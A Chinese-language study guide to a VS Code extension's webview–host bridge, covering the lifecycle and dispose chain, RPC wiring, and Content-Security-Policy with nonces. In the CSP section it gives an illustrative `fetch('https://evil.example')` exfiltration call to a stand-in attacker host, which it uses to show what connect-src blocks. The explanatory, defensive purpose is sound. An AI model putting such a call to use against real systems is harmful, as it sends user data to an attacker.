# 01 · KimiWebviewProvider 与 Bridge 通信详解

> 时效基线：基于 commit `2056261f0`（2026-08-24）。行号会随代码演进漂移，引用以当前仓库为准；本文所有行号均已对照源码核实。
> 写给谁：读完 `学习文档/02-VSCode插件源码导读.md`（插件骨架）后，想真正看懂"webview ↔ 插件宿主"这一个子系统的人。
> 与相邻篇的分工：`学习文档/02-VSCode插件源码导读.md` 给全插件的地图；本篇把其中最核心的通信子系统拆到每一行——KimiWebviewProvider、BridgeHandler、协议本体、会话路由、SessionRuntime 内部、基线/diff、webview 的 React 侧。同目录 `dive-chain-broadcast链条详解.md` 把 broadcast 这一根线拆到每一站。调试方法见 `学习文档/03-调试指南.md` 第 1-2 节。
> 引用约定：本文裸写的 `02` 指同目录的源码详解篇；根目录 `学习文档/` 下的篇一律用全名引用。
> 旧数据迁移（`src/migration/`、`LegacyMigrationManager`）按约定**不在本篇范围**，只在必须提到处一句话带过。
> 实测基线：`pnpm -C apps/vscode exec vitest run test/bridge-handler.test.ts test/event-adapter.test.ts` → **52 个测试全部通过**（2026-08-24）。

## 〇、全局认知

1. **插件界面是"宿主 TS + 网页"两层，两层之间只有一根线**：webview（内嵌网页，只有浏览器 API）和扩展宿主（Node.js，能读写文件起进程）之间唯一的通道是 `postMessage` 消息（术语见 `学习文档/08-术语表.md`"postMessage"）。本篇讲的全部内容就是这根线上的规矩。

2. **消息分两个方向、两种格式**：webview → 宿主是 **RPC 请求**（`{id, method, params}`，等回包）；宿主 → webview 是**单向广播**（`{event, data}`，不等回包）。方向决定格式，格式决定处理代码在哪个文件。

3. **四个类各管一层，职责严格单调**：`KimiWebviewProvider`（管 webview 的生死和 HTML）→ `BridgeHandler`（RPC 分发中枢 + 资源主人）→ `KimiRuntime`（会话池与视图路由）→ `SessionRuntime`（单会话状态机，唯一订阅引擎事件的地方）。每层只认识相邻层。

4. **流式内容不走 RPC 回包**：`streamChat` 这个 RPC 方法的返回值只有 `{done: boolean}`，聊天过程中的每一段文字/工具调用/审批弹窗，全部通过 `streamEvent` 广播逆流回 webview。RPC 管"开始和结束"，广播管"过程"。

5. **webview 被当不可信输入对待**：它的消息进宿主前先过 300 行手写校验（`shared/bridge.ts:104-221`），HTML 带 CSP + nonce，trace 日志刻意不记参数内容。

## 一、KimiWebviewProvider：webview 的装配工

`src/KimiWebviewProvider.ts`（全 182 行）。它不处理任何业务消息——业务全部委托给 `BridgeHandler`，自己只做"webview 的装配与生死管理"。

### 1.1 webview 的两种来源

| 来源 | 入口 | webviewId 前缀 | 触发方式 |
|---|---|---|---|
| 侧边栏 | `resolveWebviewView`（`KimiWebviewProvider.ts:51-59`） | `sidebar_` + UUID | VS Code 侧边栏渲染 `kimi.webview` 视图时自动调用 |
| 独立面板 | `createPanel`（`KimiWebviewProvider.ts:61-78`） | `panel_` + UUID | 命令 **Kimi Code: Open in New Tab**（`extension.ts:96`） |

侧边栏视图的注册链：`package.json:179-185` 声明视图容器 `kimi-sidebar` 里有个 `type: "webview"`、`id: "kimi.webview"` 的视图 → `extension.ts:67` 用 `registerWebviewViewProvider("kimi.webview", provider)` 把 provider 挂上去，并带 `retainContextWhenHidden: true`（侧边栏切走不销毁、状态不丢）。

**生死的总闸：context.subscriptions 与 dispose 链**

provider 在 `extension.ts` 里出现两次，干的是两件不同的事：

**第一处：`registerWebviewViewProvider` 那行——注册（"挂"）**。`package.json:179-185` 只**声明**了"侧边栏有个 id 为 `kimi.webview` 的 webview 视图"（视图容器里留了个坑位）；`vscode.window.registerWebviewViewProvider("kimi.webview", provider, {...})`（`extension.ts:67`）把 provider 实例**绑到这个 id 上**——之后 VS Code 渲染这个视图时会回调 provider 的 `resolveWebviewView`，把真正的 webview 交给它装配。没有这一步，坑位是空的，侧边栏点开什么都没有；

**第二处：`context.subscriptions.push(provider, outputChannel)`（`extension.ts:30`）——登记销毁钩子**。

- `context.subscriptions` 是 VS Code 插件的**统一清理清单**：往里 push 的每个对象在插件停用（deactivate）时会被 VS Code 逐个调 `.dispose()`；

- 这背后是 VS Code 的 **Disposable 模式**：凡占用资源的对象（事件监听、文件 watcher、引擎会话、输出通道）都实现 `dispose()`——"怎么释放"由对象自己写，"什么时候释放"交给 VS Code 生命周期；

- provider 必须进这份清单，因为它的 `dispose()`（`KimiWebviewProvider.ts:39-41`）牵着**最重的一串资源**：

```
deactivate()（extension.ts:144-146，先 await provider.shutdown()）
→ BridgeHandler.dispose()（bridge-handler.ts:292-295）
   ├─ fileManager.dispose()（file.manager.ts:201-207）→ 注销全工作区 FileSystemWatcher
   └─ runtime.dispose()（kimi-runtime.ts:224-231）
      ├─ 逐个 SessionRuntime.close()（session-runtime.ts:395-418）→ 取消进行中回合、退订引擎事件、关闭 SDK 会话
      └─ harness.close() → 关掉整个引擎
```

（`shutdown()`（`KimiWebviewProvider.ts:43-45`）和 `dispose()` 调的是同一个 `bridgeHandler.dispose()`，区别只是前者 await、后者 fire-and-forget；`deactivate` 显式 await 的是 `shutdown`，subscriptions 里的 `dispose` 是兜底。重复触发无害——`KimiRuntime.dispose` 有 `closed` 守卫，`kimi-runtime.ts:225`。）

**能 push 任意东西吗：看"形状"，不看"出身"**

先给结论：**不能 push 任意东西，但也不需要"是 Disposable"；只要求对象身上有一个 `dispose()` 方法**。你看到"他俩都没有"，是因为三个事实凑在一起：

1. `subscriptions` 的元素类型**不是** `Disposable[]`，而是一个**匿名形状**：

```ts
// node_modules/@types/vscode/index.d.ts:8373-8377（ExtensionContext 里）
readonly subscriptions: {
    /** Function to clean up resources. */
    dispose(): any;
}[];
```

2. `Disposable` 在 vscode.d.ts 里是个 **class**（`index.d.ts:1718`），但 VS Code 全程用的是"形状"而非"实例"——它的静态方法 `Disposable.from` 参数名就叫 **disposableLikes**，JSDoc 原话：

```ts
// index.d.ts:1718-1733（节选 JSDoc）
/**
 * Combine many disposable-likes into one. You can use this method when having objects with
 * a dispose function which aren't instances of `Disposable`.
 */
static from(...disposableLikes: { dispose: () => any }[]): Disposable;
```

"不是 Disposable 实例、但有 dispose 函数的对象"——VS Code 官方给这类东西起的名字就是 **disposable-like**。

3. 你说"他俩都没有"——逐个看：

```ts
// KimiWebviewProvider.ts:19、39-41 —— 类声明只 implements 了 WebviewViewProvider
export class KimiWebviewProvider implements vscode.WebviewViewProvider {
  // ...
  dispose(): void {
    void this.bridgeHandler.dispose();
  }
}
```

provider 确实**没写** `implements Disposable`，但它有 `dispose(): void`——TypeScript 是**结构类型（structural typing，按形状匹配，不按声明匹配）**：赋值只检查"身上有没有要求的成员"，不检查"声明过自己是谁"。形状吻合 `{ dispose(): any }` → push 合法，不需要"户口"；

- outputChannel：`createOutputChannel` 的返回类型 `vscode.OutputChannel` 是个**独立接口**（`index.d.ts:7347`，`export interface OutputChannel {`），**没有 extends Disposable**——它合法的原因同样是"形状"：接口体内自己带了一个 `dispose(): void` 成员（`:7406`）。

**运行时那一面**：`subscriptions` 就是个普通数组，`push` 就是普通数组的 push，JS 层面什么都不检查；插件停用时 VS Code 逐个调 `.dispose()`，塞进去没有 dispose 的东西会当场抛错——TS 的形状检查挡的就是这一层（绕过类型硬塞，炸在停用时）。

**一个衔接前面的彩蛋**：subscriptions 的 JSDoc 还写着一句 "asynchronous dispose-functions aren't awaited"（`index.d.ts:8371`）——**dispose 返回的 Promise 不会被等待**。这正好解释了上面括号注里那对方法为什么成对存在：`dispose()` 里写 `void this.bridgeHandler.dispose()`（点火就不管），`deactivate` 里显式 `await provider.shutdown()`（等清理链跑完再退）。

**"那对方法"= `dispose()` 和 `shutdown()`：两个入口，同一个清理**

指 `KimiWebviewProvider` 上这两个挨着的方法：

```ts
// KimiWebviewProvider.ts:39-45
dispose(): void {
  void this.bridgeHandler.dispose();    // ① 点火就返回，不等
}

shutdown(): Promise<void> {
  return this.bridgeHandler.dispose();  // ② 把 Promise 交出去，让调用方 await
}
```

方法体几乎一样（都调 `bridgeHandler.dispose()`），"成对存在"指的是：**同一个清理动作开了两个门，分别配两种"等不等得起"的调用方**。为什么需要两个门，链条是这样的：

1. `bridgeHandler.dispose()` 是**异步**的——关 watcher、逐个关会话、关 harness，都是要花时间的 IO（`bridge-handler.ts:292-295`）：

   ```ts
   // src/bridge-handler.ts:292-295
   async dispose(): Promise<void> {
     this.fileManager.dispose();      // 关全工作区 FileSystemWatcher
     await this.runtime.dispose();    // 关全部会话 + harness
   }
   ```

   上面那张树状图清理链（用 `├─` 字符拼的纯文本图）里 "runtime.dispose()" 那两行的真身（括号注里说的 `closed` 守卫也在这里）：

   ```ts
   // src/runtime/kimi-runtime.ts:224-231
   async dispose(): Promise<void> {
     if (this.closed) return;         // ← 括号注里说的 closed 守卫就是它
     this.closed = true;
     await Promise.all([...this.sessions.values()].map((session) => session.close()));
     this.sessions.clear();
     this.sessionByView.clear();
     await this.harness.close();
   }
   ```

2. **门 ① dispose()：给 subscriptions 用**。VS Code 停用插件时逐个调清单项的 `.dispose()`，而且 JSDoc 明说了"返回的 Promise 不会被等待"（`index.d.ts:8367-8377`）——就算你把 dispose 声明成 async、返回 Promise，VS Code 也只当它同步调完就走。所以这里干脆 `void` 掉：点火、立即返回，**语义上就承认"我不保证清理跑完"**：

   ```ts
   // node_modules/@types/vscode/index.d.ts:8367-8377 —— subscriptions 的完整 JSDoc 与类型
   /**
    * An array to which disposables can be added. When this
    * extension is deactivated the disposables will be disposed.
    *
    * *Note* that asynchronous dispose-functions aren't awaited.
    */
   readonly subscriptions: {
       /** Function to clean up resources. */
       dispose(): any;
   }[];
   ```
3. **门 ② shutdown()：给 deactivate 用**。VS Code 对 `deactivate()` 的约定不同——**它返回 Promise 时 VS Code 会等这个 Promise**（插件停用有总时限，超时才强杀；具体秒数属 VS Code 内部实现，未验证）。于是：

```ts
// extension.ts:144-148
export async function deactivate(): Promise<void> {
  log("Kimi Code deactivating");
  await provider?.shutdown();   // ← 等：清理链真正跑完，扩展宿主才退场
  provider = undefined;
}
```

4. 换句话说：**走 subscriptions 的 dispose 是"尽力而为的兜底"（万一 deactivate 没被调到，比如异常路径），走 deactivate 的 `await shutdown()` 才是"主退场"**。两个门都会被触发、都会调到同一个 `bridgeHandler.dispose()`，重复无害——`KimiRuntime.dispose` 有 `closed` 守卫（`kimi-runtime.ts:225`），第二次调用直接返回。

**为什么不能合成一个门**：只留 `dispose()` 的话，deactivate 没法等——subscriptions 的 dispose VS Code 不等，直接调 `provider.dispose()` 也拿不到 Promise（它返回 void）；只留 `shutdown()` 的话，subscriptions 清单里就没有形状合格的 `dispose()` 方法，push 不进去（形状要求见上面"能 push 任意东西吗"）。所以必须成对。

顺带注意 `extension.ts` 里其实 push 了**四类** 

Disposable：provider 和 outputChannel（`:30`）、`kimi-baseline` 

内容提供器（`:39-53`）、设置监听 + `registerWebviewViewProvider` 的**返回值**（`:66-69`——这个 dispose 只负责"解除视图 id 与 provider 的绑定"，不碰会话，跟 provider 自己的 dispose 是两码事）

以及循环注册的每个命令（`:129-130`）。

**"这个 dispose"是哪一个：`registerWebviewViewProvider` 的返回值**

先看两段代码，这就是那"两码事"的实体：

```ts
// extension.ts:30 —— 清单项 1：provider 对象本身
context.subscriptions.push(provider, outputChannel);

// extension.ts:66-69 —— 清单项 2：registerWebviewViewProvider 的返回值
context.subscriptions.push(
  onSettingsChange((changedKeys) => { /* ... */ }),
  vscode.window.registerWebviewViewProvider("kimi.webview", provider, {
    webviewOptions: { retainContextWhenHidden: true },
  }),
);
```

VS Code 的注册类 API 有个通用契约：**注册什么，就返回一个"注销器"（Disposable）**。`registerWebviewViewProvider` 返回的那个 Disposable，它的 `dispose()` 只干一件事：

- 把 VS Code 内部注册表里 `"kimi.webview" → provider` 这条**映射**删掉。之后 VS Code 渲染侧边栏视图时**不再回调** `provider.resolveWebviewView`——"解除视图 id 与 provider 的绑定"指的就是这个；

- 它**不会**调用 `provider.dispose()`。provider 自己的 `dispose()` 由另一条清单项触发（`:30` push 的 provider 对象）：

```ts
// extension.ts:30
context.subscriptions.push(provider, outputChannel);

// KimiWebviewProvider.ts:39-41
dispose(): void {
  void this.bridgeHandler.dispose();   // → 关 watcher、关全部会话、关 harness（上面的清理链）
}
```

两条各管一头，所以清单里**两条都要有**：

| 清单项 | 它的 dispose 干什么 | 不管什么 |
|---|---|---|
| `registerWebviewViewProvider(...)` 的返回值（`:66-69`） | 解除"视图 id → provider"的注册映射，VS Code 不再回调装配 | 不碰 BridgeHandler / 会话 / 引擎 |
| `provider` 对象本身（`:30`） | 走清理链：watcher、全部 SessionRuntime、harness | 不管注册映射 |

（"解除映射"是 VS Code API 的语义，仓库代码里看不到它的实现——它活在 VS Code 内部；仓库里能看到的只是这两条 dispose 的分工。）

**`createPanel`（`KimiWebviewProvider.ts:61-78`）具体是干嘛的**

在编辑器区域开一个"文档标签页"形态的完整 Kimi 界面，是命令 **Kimi Code: Open in New Tab** 的实现体（`extension.ts:95-97`）：

- `vscode.window.createWebviewPanel("kimiPanel", "Kimi Code", ViewColumn.One, {...})`（`:64-68`）：`"kimiPanel"` 是面板的 view type，`"Kimi Code"` 是标签页标题，选项同样开了 `enableScripts` 和 `retainContextWhenHidden`（切到别的标签页不销毁）；

- 它和侧边栏的区别**只在容器**：侧边栏视图装在活动栏侧边栏里（VS Code 在视图首次可见时回调 `resolveWebviewView` 创建）；panel 是编辑器区的一个标签页（用户命令主动创建、像关标签页一样关闭）；

- 装配完全同路：`setupWebview`（`:70`）→ 同样的 HTML/CSP、同样的 `panel_<uuid>` webviewId、接进**同一个** BridgeHandler——所以面板和侧边栏同时开着就是两个视图，可以各自绑定不同会话/工作目录（路由按 webviewId 区分，第五节），也可以订阅同一个会话（多视图广播，第六节）；

- **没有去重**：每执行一次命令就再开一个新面板（每次新 UUID）——想开两个并排对比是支持的，但连按命令不会复用旧标签页。

**webviewId 是一切路由的钥匙**：每个 webview 出生时拿到 `sidebar_xxx` / `panel_xxx` 形式的唯一 id（`:52`、`:62`），之后宿主侧的会话路由（第五节）、基线跟踪、广播定向全都以它为 key。它通过 `<body data-webviewid="...">` 注进页面（`:176`），webview 端启动时读出来附在每个 RPC 请求上（`webview-ui/src/services/bridge.ts:46`）。

### 1.2 setupWebview：接线的三件事

`setupWebview`（`:97-110`）对每个新 webview 做三件事：

1. **开权限、圈资源**：`enableScripts: true`（webview 里要跑 JS）+ `localResourceRoots: [extensionUri]`（页面只许加载插件目录内的资源）；

2. **塞 HTML**（`:103`，见 1.3）；

3. **接线收发**（`:106-109`）：`webview.onDidReceiveMessage` 收到任何消息 → 全部交给 `this.bridgeHandler.handle(msg, webviewId)` → 把返回的 `RpcResult` 用 `webview.postMessage` 原路发回。**Provider 自己不看消息内容**。

销毁是对称的：`webviewView.onDidDispose`（`:55-58`）/ `panel.onDidDispose`（`:72-75`）→ `bridgeHandler.disposeView(webviewId)`（拆会话订阅，见第五节）→ 从 `webviews` Map 里删掉。

### 1.3 HTML 拼装：CSP 八条与 nonce

`getHtml`（`:152-181`）手写整个页面：

- **脚本地址转换**：`const scriptUri = webview.asWebviewUri(vscode.Uri.joinPath(this.extensionUri, "dist", "webview.js"));`（`:153`）把 `dist/webview.js`（vite 构建的 React 产物，`dev:webview` 任务产出）转成 `https://xxx.vscode-resource.vscode-cdn.net/<原绝对路径>` 形式的 https 地址（实测示例：`https://file+.vscode-resource.vscode-cdn.net/Users/.../apps/vscode/dist/webview.js`，本地路径被编码进 host+path）——webview 沙箱里不能直接用磁盘路径；

> ⚠️ 注意这里的这个地址是html中的 `script` 的地址(如同在网页中引入`JQurey`), 不是 打开 `html` 的这个网址

**加载 `dist/webview.js`，debug 时不能实时改吗？**

- 是的，webview 里跑的永远是**编译产物** `dist/webview.js`——这个 webview **没有 vite dev server、没有 HMR**（热更新：vite 开发服务器让浏览器不刷新就局部替换模块的机制）。原因：webview 是隔离沙箱，HTML 由宿主手写（`getHtml`），脚本地址固定指向 `dist/webview.js`（`KimiWebviewProvider.ts:153`），不是指向某个 localhost 开发服务器；

- 但也不是"每次手动编译"：F5 的 preLaunchTask 里 `dev:webview` 就是 `vite build --watch --sourcemap`（定义在 `apps/vscode/package.json` 的 scripts，`学习文档/03-调试指南.md` 第 1 节讲过）——**watch 模式自动增量编译**，你改 `webview-ui/` 下的源码，一两秒后 `dist/webview.js` 自动更新；

- 所以开发循环 = 改代码 → watch 自动重编 → **reload webview**（宿主窗口命令面板 **Kimi Code: Reset Kimi** 或 Reload Window）让页面加载新 bundle。没有局部热替换，整页刷新，React 状态清零；

- 构建形态是**单文件产物**：vite 配置固定文件名 + CSS 也打进 JS——

```ts
// webview-ui/vite.config.ts:11、23、28（节选）
plugins: [react(), tailwindcss(), cssInjectedByJsPlugin()],  // CSS 注入 JS，不单独出 .css
build: {
  outDir: resolve(webviewRoot, "../dist"),
  // rollupOptions.output 里： fileName: () => "webview.js"   // 永远叫 webview.js
}
```

所以 HTML 里只需要一个 `<script src>`。

---

- **CSP（Content-Security-Policy，页面能加载什么资源的白名单）八条**（`:157-166`）：`default-src 'none'` 起手（默认全禁），再逐条给 `style/img/font/media/connect/worker` 加上 `cspSource`（VS Code 分配给本 webview 的资源前缀）放行，最关键的收尾是 `script-src 'nonce-${nonce}'`——**只许带本次 nonce 的脚本执行**；

- **nonce（一次性随机数，32 位随机字符串，`:6-13`）**：每次生成 HTML 都新造一个（`:155`），只有 `<script nonce="...">` 标签（`:178`）和 CSP 里的那份一致，脚本才被允许跑。作用：即使攻击者往 webview 里注入了 HTML，注入的 `<script>` 拿不到本次 nonce，执行不了——每次刷新换新 nonce，旧的立即作废；

**CSP 和 nonce：作用与原理**

**CSP（Content-Security-Policy，内容安全策略）**是浏览器标准机制：页面自己声明一张白名单——"我这张页面允许从哪加载什么、执行什么"——浏览器（这里是 webview 的 Chromium 内核）强制执行。注意它是**预防**不是检测：违规资源直接被拦下，不执行。

本页的八条（`KimiWebviewProvider.ts:157-166`），核心是三条：

```ts
// KimiWebviewProvider.ts:157-166（节选三条，完整八条见源码）
`default-src 'none'`,                     // 默认全禁：没单独放行的资源类型一律不许加载
`connect-src ${webview.cspSource}`,       // 只许连 VS Code 分配给本 webview 的资源源
`script-src 'nonce-${nonce}' ${webview.cspSource}`,
```

- `default-src 'none'` 起手 = **白名单思路**：先全禁，再逐条放行（`style/img/font/media/connect/worker` 全部只许指向 `cspSource`——VS Code 给这个 webview 分配的资源前缀，相当于"只许加载本插件自己的资源"），所以页面**没法从互联网 CDN 拉脚本**；

- `script-src 'nonce-${nonce}'` 是最严的一道：不是"只许某个域名"，而是"**只许带本次 nonce 的那一个 script 标签**"。

**八条指令各管什么（`connect-src` 是干嘛的）**

`script-src` 管"加载并执行脚本"；`connect-src` 管 **JS 发起的网络请求**——`fetch()`、`XMLHttpRequest`、`new WebSocket()`、`EventSource` 全归它审。

本页 `connect-src ${webview.cspSource}` = 页面 JS 只能请求自己源/VS Code 资源域，**任何外部 API、WebSocket 都连不上**。实际效果：插件 UI 自己调不了外部 HTTP 接口——要外部数据必须走宿主 RPC，由宿主的 Node 侧去联网。

双保险视角：攻击例子里 `fetch('https://evil.example')`——就算脚本以某种方式跑起来了（过了 script 关），fetch 也会被 `connect-src` 拦下。**script-src 挡"跑起来"，connect-src 挡"跑起来之后往外送"**。

| 指令 | 管什么 | 本页放行范围 |
|---|---|---|
| `default-src` | 兜底：其他指令没覆盖的资源类型归它 | `'none'` 全禁 |
| `style-src` | 样式（`<style>`、`<link rel=stylesheet>`、行内 style） | cspSource + 所有内联样式 |
| `img-src` | 图片 | cspSource + `data:`/`blob:`（base64 图、运行时生成的图） |
| `font-src` | 字体 | cspSource |
| `media-src` | 音视频 | cspSource + `data:`/`blob:` |
| `connect-src` | **JS 发起的连接**（fetch/XHR/WebSocket） | 只有 cspSource |
| `worker-src` | Web Worker 脚本 | cspSource + `blob:` |
| `script-src` | 脚本 | 只有带 nonce 的那个标签 + cspSource |

**`cspSource` 是什么：一段"拼进 CSP 就能用"的预制源列表**

`debug` 时看到它的值是 `'self' https://*.vscode-cdn.net`——三点拆开：

1. **它不是普通的 origin 字符串，而是一段"预制好的 CSP 源列表"**——官方 JSDoc 明说了它的用途就是"应该被用在 CSP 规则里"：

```ts
// node_modules/@types/vscode/index.d.ts:9978-9988（Webview.cspSource 的 JSDoc）
/**
 * Content security policy source for webview resources.
 *
 * This is the origin that should be used in a content security policy rule:
 *
 * ```ts
 * `img-src https: ${webview.cspSource} ...;`
 * ```
 */
readonly cspSource: string;
```

所以代码里直接模板拼接 `connect-src ${webview.cspSource}`（`KimiWebviewProvider.ts:163`），拼出来的最终 CSP 就是 网页中看到的`connect-src 'self' https://*.vscode-cdn.net`。

2. **网页打开有两个值, 1: 浏览器的输入地址；2: `html`中允许加载的源的地址 **：

webview 显示的是代码中手写的那份 HTML（`getHtml` 的返回值），但 Chromium（webview 的内核）只认"网址世界"。VS Code 的实际安排是**两套地址**（各有一条实测）：

  1️⃣. **页面本身**：住在一个自定义协议的地址上——`vscode-webview://<一串随机字符>/index.html?...`。随机串每个 webview 唯一 → **每个 webview 的源都不同**（协议 + 随机串构成源）：所以当打开侧边栏的时候,**就如同在浏览器里输入了一个网址** 就是这个地址,同时开着侧边栏和面板两个 webview 时互为不同源，一边的 JS 读不到另一边的 DOM——这就是"每个 webview 一个独立 origin"，webview 之间的互相隔离；

  2️⃣. **页面里的资源**（script、图片）：`webview.asWebviewUri()`（`:153`）把本地绝对路径编码成 https 地址——例如 `dist/webview.js` 变成 `https://file+.vscode-resource.vscode-cdn.net/Users/.../apps/vscode/dist/webview.js`，路径进了 `host+path`，整个地址落 在 `vscode-cdn.net` 域下；

所以 `cspSource` 的两段各覆盖一边：`CSP`的第一段 **`'self'`** = "**当前页面本身的源**"，就是`1`里面的那个 `vscode-webview://<随机串>`；`CSP`的第二段 **`https://*.vscode-cdn.net`** = 放行**页面里的地址**所在的整个域——scriptUri 那种地址由此通过 CSP。为什么用通配而不是写死：随机串每个 webview 都不同，而 HTML 是同一份代码生成的，写死没法覆盖，通配整个域才全管；

3. **为什么不手写这个域**：值随环境变（桌面 / 远程 / vscode.dev 各不相同——远程环境的具体值未验证），写死就跨环境崩。用 `cspSource` 让 VS Code 自己告诉 CSP "该放行哪个源"——这就是上文那句"VS Code 给这个 webview 分配的资源前缀"的实体。

**拼进 CSP 之后，它到底干了什么**

用实测值代入，最终拼出来的整条指令是：

```
script-src 'nonce-Ab3x…' 'self' https://*.vscode-cdn.net
```

CSP 对一个 `<script>` 设了**两道关**，两道都过才执行：

| 关卡 | 由哪个 token 把守 | 检查什么 |
|---|---|---|
| ① 标签可信吗 | `'nonce-Ab3x…'` | 这个 `<script>` 标签带没带本次 nonce（防注入的就是它） |
| ② 地址允许吗 | `'self' https://*.vscode-cdn.net` | 标签 src 指向的**地址**在不在放行名单里 |

拿页面里真实的那个标签过一遍——`<script nonce src="https://file+.vscode-resource.vscode-cdn.net/.../dist/webview.js">`：

- 第①道：带了 nonce，过；

- 第②道：地址落在 `*.vscode-cdn.net` 域内，过——两道全过，执行。

**如果名单里没有 cspSource 会怎样**：八条指令都以 `default-src 'none'`（全禁）起手，`script-src` 若只写 `nonce`，那么标签本身合法（过了①），但它要**下载的文件地址**不在名单（②被拒）——**webview.js 根本拉不下来，页面直接白屏**。

所以 `'self' https://*.vscode-cdn.net` 是干嘛的，一句话：**放行"页面自己的源"和"VS Code 的资源域"，让自家的 script/样式/图片能加载进来**。它只认 VS Code 的域、不放行互联网——白名单没有因此变大，只是给"自己人"开了门。

**开发者工具里`location.href` 里为什么看不到 `vscode-cdn.net`**

`location.href` 是"页面自己的地址"，`scriptUri` 是"页面里 `<script>` 标签的 src"——两个东西. 打开一个插件就比如打开一个网页,要输入网址是, 页面地址是 `https://www.example.com`(浏览器打开的地址)，它加载的 JS 完全可以是 `https://cdn.example.net/app.js`——**页面地址和资源地址本来就是两回事, `vscode-cdn.net` 属于资源的地址，浏览器打开的网址是页面地址**；

**在 DevTools 里去哪亲眼看到 scriptUri**（三选一）：

1. **Elements 面板**：找 `<script nonce="…" src="https://file+.vscode-resource.vscode-cdn.net/.../webview.js">` ——src 就是 scriptUri 原文（`getHtml` 写进去的）；

2. **Network 面板**：刷新 webview 后过滤 JS，能看到对 `https://…vscode-resource.vscode-cdn.net/.../webview.js` 的请求（状态 200）；

3. **Console**：`document.querySelector('script[src]')?.src`。

**从 `document.getElementById('active-frame').contentWindow.location.href` 这条命令还能读出一层结构**：它能执行，说明 DevTools 挂在 VS Code 的 **webview 外壳页**上（它内部放 iframe），真正的插件 HTML 在 `active-frame` 这个 **iframe** 里。所以 webview 实际是两层：

```
外壳页（VS Code 内部的容器页，负责管理 iframe）
  └─ <iframe id="active-frame">   ← 你的 HTML 住这里，地址 vscode-webview://1f60…/index.html
        └─ <script src="https://file+.vscode-resource.vscode-cdn.net/.../webview.js">   ← scriptUri 在这
```

CSP 写在**内层 HTML** 的 meta 里、对内层文档生效——所以"scriptUri 过没过"看的是内层那份名单（`*.vscode-cdn.net` 放行），跟外壳页是什么、跟 `location.href` 显示什么**无关**。

（查的时候注意 query 里的 `extensionId`：`saoudrizwan.claude-dev` 是 Cline 的 webview——机制一致，但想看 kimi 的，要在 F5 宿主窗口里开 Webview Developer Tools。）


**为什么 VS Code 注入的 `_vscodeApiScript` 没有 nonce 也能执行**

DevTools 里还能在 `<head>` 里看到两个我们没写过的元素：`<style id="_defaultStyles">`（一整套 `--vscode-*` 变量的主题样式）和 `<script id="_vscodeApiScript">`（定义 `acquireVsCodeApi` 的那段）。

先确认身份：仓库源码里 grep 不到 `_vscodeApiScript`、`_defaultStyles`、`__vscode_post_message__`（零命中）

`getHtml` 的输出只有 `charset/viewport/CSP meta/title/body/script` 六样。**这两个元素是 VS Code 在把 HTML 送进 iframe 之前自己注入的**。

- **`_defaultStyles`**：VS Code 给所有 webview 预置的"主题底妆"——字体、滚动条、链接色、代码块样式全跟编辑器主题走，插件作者不用自己写主题 CSS。它为什么能生效：它插在 CSP meta **之前**（存档第 5 行 vs meta 第 146 行），天生不受规则管；就算放在 meta 之后，也会被 `style-src … 'unsafe-inline'`（放行所有内联样式）覆盖——两头都成立；

- **`_vscodeApiScript`（没有 nonce 为什么能执行）——分四步**：

1. **先摆正管道。** 你以为的管道是"`getHtml` 写 HTML → 浏览器执行"；真实的管道是三段：

    ```
    getHtml 写的 HTML ──→ VS Code（中间处理）──→ 浏览器（iframe）最终收到的 HTML
    ```

    那句话里三个词逐一落地：

    - **"你写的代码"** = `getHtml` 返回的那个 **HTML 字符串**（`KimiWebviewProvider.ts:168-180` 的 template literal）。此刻它只是宿主进程内存里的一串字符，**还没有任何浏览器见过它**；
    - **"中间这段"** = 把字符串赋给 `webview.html = ...`（`:103`）之后、浏览器开始渲染之前的那趟**运送**。VS Code 是送货的：它**不原样转交**——先拆开包裹，把自己的 `<style>` 和 `<script>` **插在最前面**，再把包裹递给 iframe 里的浏览器；
    - **"浏览器不读你的代码"** = 执行 CSP 和脚本的那个 Chromium 从头到尾**没见过你的原版字符串**；它见到的第一份、也是唯一一份 HTML，就是 VS Code 加过料的那份。你的原版在半路就被换掉了。

    打个比方：你写了封信，家规（CSP）写在信纸中间，还带着一个有通行证的人（你的 script）。你把信交给物业转发（`webview.html = ...`）；物业没原样转交——拆开，把自己的人**安置在家规那一行之前的座位上**，然后才递给收信人（浏览器）。收信人从上往下读：先遇到的人先安置，读到家规才开始检查之后进门的人。

2. **VS Code 只干了一件事，而且没动你的白名单**

把两个元素（`_defaultStyles`、`_vscodeApiScript`）插在 `<head>` 最前面，排在你的 CSP meta**之前**。

拿存档的最终 HTML（`tesst.html`）对过行号：`_defaultStyles` 第 5 行、`_vscodeApiScript` 第 109-143 行、CSP meta 第 146 行、我们的 `<script nonce src>` 第 8069 行；整份文件 `sha256` **零命中**——八条白名单一字未改（只有 `${cspSource}` 被替换成实际值 `'self' https://*.vscode-cdn.net`）；

3. **执行时机的关键**：浏览器从上往下逐行解析，读到 `<script>` 当场执行；读到 CSP meta 那一刻规则才装上——而 meta 版 CSP **只管辖"出现在它之后"的内容，不追溯之前**（CSP 标准行为，也是 VS Code 文档强调"CSP meta 要放 head 最前面"的原因）。注入脚本执行时八条规则还没被读到：它不是"通过了检查"，是"**检查还没开始**"；

4. **你的脚本为什么必须带 nonce**：`<script nonce src="…webview.js">` 在第 8069 行、规则**之后**，落在管辖范围内，必须过两道关（nonce + 地址名单）。规则对它一切照旧。

打个比方：你把家规（CSP）写在信纸**中间**，物业（VS Code）把自己的人安置在**家规那一行之前**的座位上——规则只管它之后进门的人，先坐下的不用检票。你要防的"混进来的陌生人"（注入的脚本）出现在规则之后：没手环（nonce）、地址也不在名单——照样被拦。（`acquireVsCodeApi` 的出生地就是这段注入脚本——它不是 bundle 里的函数，`services/bridge.ts:48` 调用的就是它。）

注入代码里有三个值得认识的安全细节：

```js
globalThis.acquireVsCodeApi = (function () {
  const originalPostMessage = window.parent['__vscode_post_message__'].bind(window.parent);
  // ...
  return () => {
    if (acquired && !false) {   // 只许成功调用一次，第二次直接 throw
      throw new Error('An instance of the VS Code API has already been acquired');
    }
    acquired = true;
    return Object.freeze({ postMessage, setState, getState });
  };
})();
window.parent = window;      // 把"父窗口"指回自己
window.top = window;         // "顶层窗口"也指回自己
window.frameElement = null;  // 藏掉"我在哪个 iframe 里"的信息
```

- `acquired` 标志 + `Object.freeze`：整页只能拿到一次 API、拿到的对象冻结不可改——"acquireVsCodeApi 只能调用一次"的实现就是它（`bridge.ts` 构造函数里调用那一次）；

